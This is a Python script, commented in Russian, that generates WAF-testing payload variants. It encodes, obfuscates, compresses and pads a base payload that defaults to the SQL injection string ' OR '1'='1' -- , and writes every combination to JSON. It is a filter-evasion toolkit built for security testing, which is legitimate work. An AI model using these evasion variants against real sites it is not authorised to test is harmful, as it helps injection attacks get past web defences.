#!/usr/bin/env python3
"""
Генератор вариантов пейлоадов для тестирования WAF.
Поддерживает:
  - различные кодировки и обфускации
  - реальное сжатие (gzip, brotli, deflate) с сохранением в base64
  - добавление «мусорного» префикса для увеличения размера
  - два порядка: encode-then-pad и pad-then-encode
Выходной JSON содержит поля:
  - name: описание преобразований и размера
  - payload: итоговая строка (для сжатых — base64)
  - size: длина в байтах (UTF-8)
  - encodings: список применённых техник
  - is_compressed: bool
  - compression: тип сжатия (gzip, br, deflate) или null
"""

import argparse
import base64
import gzip
import zlib
import itertools
import json
import random
import urllib.parse
from typing import List, Tuple, Callable, Optional

# ---------- Импорт brotli (опционально) ----------
try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False
    print("Warning: brotli not installed. Brotli compression will be skipped.")

# ---------- Функции сжатия ----------
def compress_gzip(data: bytes) -> bytes:
    return gzip.compress(data)

def compress_brotli(data: bytes) -> bytes:
    if HAS_BROTLI:
        return brotli.compress(data)
    else:
        raise RuntimeError("brotli is not available")

def compress_deflate(data: bytes) -> bytes:
    # zlib.compress (RFC 1950) – распространённый формат
    return zlib.compress(data, level=6)

# ---------- Вспомогательные функции обфускации ----------
def escape_js(s: str) -> str:
    """Преобразует строку в JavaScript-escaped (\\xXX, \\uXXXX)."""
    res = []
    for ch in s:
        code = ord(ch)
        if code < 128:
            res.append(f'\\x{code:02x}')
        else:
            res.append(f'\\u{code:04x}')
    return ''.join(res)

def add_sql_comments(s: str) -> str:
    """Заменяет пробелы на /**/ и добавляет -- в конец."""
    return s.replace(' ', '/**/') + ' -- '

def random_case(s: str, seed: int = 42) -> str:
    """Детерминированный случайный регистр."""
    rng = random.Random(seed)
    return ''.join(ch.upper() if rng.randint(0, 1) else ch.lower() for ch in s)

def swap_case(s: str) -> str:
    return s.swapcase()

def insert_null_bytes(s: str, step: int = 3) -> str:
    """Вставляет \\x00 после каждого step-го символа."""
    chars = []
    for i, ch in enumerate(s):
        chars.append(ch)
        if (i + 1) % step == 0:
            chars.append('\\x00')
    return ''.join(chars)

def add_tabs(s: str) -> str:
    """Заменяет пробелы на табуляции."""
    return s.replace(' ', '\t')

def wrap_compression(name: str, compress_func: Callable[[bytes], bytes]) -> Callable[[str], str]:
    """Обёртка для преобразований сжатия: принимает строку, возвращает base64."""
    def wrapper(s: str) -> str:
        data = s.encode('utf-8')
        compressed = compress_func(data)
        return base64.b64encode(compressed).decode('ascii')
    return wrapper

# ---------- Список всех доступных преобразований ----------
TRANSFORMS: List[Tuple[str, Callable[[str], str]]] = [
    ('original', lambda s: s),

    # Кодировки
    ('url', lambda s: urllib.parse.quote(s, safe='')),
    ('double_url', lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')),
    ('html_entities', lambda s: ''.join(f'&#{ord(c)};' for c in s)),
    ('unicode_escape', lambda s: ''.join(f'\\u{ord(c):04x}' for c in s)),
    ('base64', lambda s: base64.b64encode(s.encode('utf-8')).decode('ascii')),
    ('base64url', lambda s: base64.urlsafe_b64encode(s.encode('utf-8')).decode('ascii')),
    ('hex', lambda s: s.encode('utf-8').hex()),
    ('utf16le_hex', lambda s: s.encode('utf-16le').hex()),
    ('utf16be_hex', lambda s: s.encode('utf-16be').hex()),
    ('js_escape', escape_js),

    # Обфускации
    ('lower', lambda s: s.lower()),
    ('upper', lambda s: s.upper()),
    ('swap_case', swap_case),
    ('random_case', lambda s: random_case(s, seed=42)),
    ('sql_comments', add_sql_comments),
    ('null_bytes', insert_null_bytes),
    ('tabs', add_tabs),

    # Сжатие (возвращают base64)
    ('gzip', wrap_compression('gzip', compress_gzip)),
]

if HAS_BROTLI:
    TRANSFORMS.append(('brotli', wrap_compression('brotli', compress_brotli)))
else:
    print("Info: Brotli compression skipped due to missing module.")

TRANSFORMS.append(('deflate', wrap_compression('deflate', compress_deflate)))

# ---------- Генерация последовательностей ----------
def generate_sequences(transforms: List[Tuple[str, Callable]], max_len: int) -> List[List[str]]:
    """Генерирует все последовательности имён преобразований длины от 1 до max_len (без повторений)."""
    names = [name for name, _ in transforms]
    combos = []
    for length in range(1, max_len + 1):
        for combo in itertools.permutations(names, length):
            combos.append(list(combo))
    return combos

def apply_sequence(seq: List[str], base_payload: str, func_map: dict) -> str:
    """Применяет последовательность преобразований к строке."""
    result = base_payload
    for name in seq:
        result = func_map[name](result)
    return result

# ---------- Основная функция ----------
def main():
    parser = argparse.ArgumentParser(
        description='Генератор вариантов пейлоадов для тестирования WAF'
    )
    parser.add_argument(
        '--payload',
        default="' OR '1'='1' -- ",
        help='Базовый пейлоад (по умолчанию SQLi)'
    )
    parser.add_argument(
        '--output',
        default='payloads.json',
        help='Выходной JSON-файл'
    )
    parser.add_argument(
        '--max-combinations',
        type=int,
        default=2,
        choices=[1, 2, 3],
        help='Максимальная длина комбинации преобразований (1-3)'
    )
    parser.add_argument(
        '--sizes',
        type=int,
        nargs='+',
        default=[0, 100, 500, 1000, 2000, 5000, 10000, 20000, 50000],
        help='Ступени размера префикса (в байтах)'
    )
    parser.add_argument(
        '--order',
        choices=['encode-then-pad', 'pad-then-encode'],
        default='encode-then-pad',
        help='Порядок применения расширения и кодирования'
    )
    args = parser.parse_args()

    base_payload = args.payload
    max_len = args.max_combinations
    sizes = args.sizes
    output_file = args.output
    order = args.order

    func_map = {name: func for name, func in TRANSFORMS}

    # Генерируем последовательности (без повторений)
    sequences = generate_sequences(TRANSFORMS, max_len)
    print(f"Сгенерировано {len(sequences)} последовательностей преобразований.")

    results = []

    for seq in sequences:
        # Определяем, есть ли сжатие в последовательности (берём последнее)
        compression_type = None
        for name in reversed(seq):
            if name in ('gzip', 'brotli', 'deflate'):
                compression_type = name
                break
        is_compressed = compression_type is not None

        # Имя последовательности
        name_prefix = '+'.join(seq)

        for size in sizes:
            if size == 0:
                prefix = ""
                size_name = ""
            else:
                prefix = 'A' * size
                size_name = f"_size{size}"

            if order == 'encode-then-pad':
                # 1. Применяем преобразования к исходному пейлоаду
                transformed = apply_sequence(seq, base_payload, func_map)
                # 2. Добавляем префикс
                payload_final = prefix + transformed
            else:  # 'pad-then-encode'
                # 1. Добавляем префикс к исходному пейлоаду
                extended = prefix + base_payload
                # 2. Применяем преобразования к расширенной строке
                payload_final = apply_sequence(seq, extended, func_map)

            # Вычисляем размер в байтах (UTF-8)
            byte_size = len(payload_final.encode('utf-8'))

            results.append({
                'name': name_prefix + size_name,
                'payload': payload_final,
                'size': byte_size,
                'encodings': seq + ([f'size_{size}'] if size > 0 else []),
                'is_compressed': is_compressed,
                'compression': compression_type,  # может быть None
            })

    # Сортируем для удобства
    results.sort(key=lambda x: x['name'])

    # Сохраняем JSON
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    print(f"Сохранено {len(results)} вариантов в {output_file}")

if __name__ == '__main__':
    main()